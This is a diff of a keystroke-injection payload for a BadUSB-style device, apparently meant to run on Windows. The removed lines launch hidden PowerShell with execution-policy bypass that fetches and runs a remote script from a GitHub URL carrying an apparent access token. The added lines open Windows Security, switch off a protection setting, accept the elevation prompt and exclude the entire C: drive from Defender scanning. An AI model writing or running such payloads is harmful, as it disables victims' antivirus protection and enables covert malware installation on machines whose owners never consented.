@@ -1,14 +1,46 @@
 REM ###########################################################
 REM #                                                         |
-REM # Title        : Windows Close All Apps                   |
+REM # Title        : Disable Windows Defender                 |
 REM # Author       : Zenin                                    |
 REM # Version      : 1.0                                      |
 REM # Category     : Execution                                |
 REM # Target       : Windows                                  |
 REM #                                                         |
 REM ###########################################################
-
-DELAY 2000
-GUI r
+DELAY 1500
+CTRL ESC
+DELAY 750
+STRING windows security
 DELAY 250
-STRINGLN  powershell -w h -ep bypass -Command  "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glitter_Scripts/main/Windows/CloseAllApps/closeAllApps.ps1?token=GHSAT0AAAAAACJCV62V5JRTVENW2PIGRDAKZJVSH5A').Content"
+ENTER
+DELAY 1000
+ENTER
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 500
+SPACE
+DELAY 1000
+ALT y
+DELAY 1000
+ALT F4
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+STRING Add-MpPreference -ExclusionPath “C:”
+ENTER
+DELAY 2000
+STRING EXIT
+ENTER
